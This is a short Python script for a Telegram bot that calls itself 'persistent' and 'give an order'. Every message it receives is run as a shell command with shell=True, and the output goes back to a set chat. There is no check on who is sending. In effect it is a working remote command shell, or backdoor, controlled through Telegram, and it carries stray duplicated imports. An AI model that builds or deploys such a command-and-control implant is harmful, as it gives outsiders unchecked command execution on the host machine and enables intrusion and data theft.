import telebot
import paramiko

# Define your Telegram Bot API token (you can obtain this from BotFather on Telegram)

TELEGRAM_BOT_TOKEN = ''
CHAT_ID = ''
import telebot
import subprocess


bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# run with /start
@bot.message_handler(commands=['start'])
def handle_start(message):
    bot.reply_to(message, "Hello world! I'm your persistent bot, give an order")

# Command executed
@bot.message_handler(func=lambda message: True)
def handle_command(message):
    command = message.text

    # Esegui il comando e ottieni l'output
    try:
        output = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
        bot.send_message(CHAT_ID, output)
    except Exception as e:
        bot.send_message(CHAT_ID, f"Error: {str(e)}")

# Run bot
bot.polling()
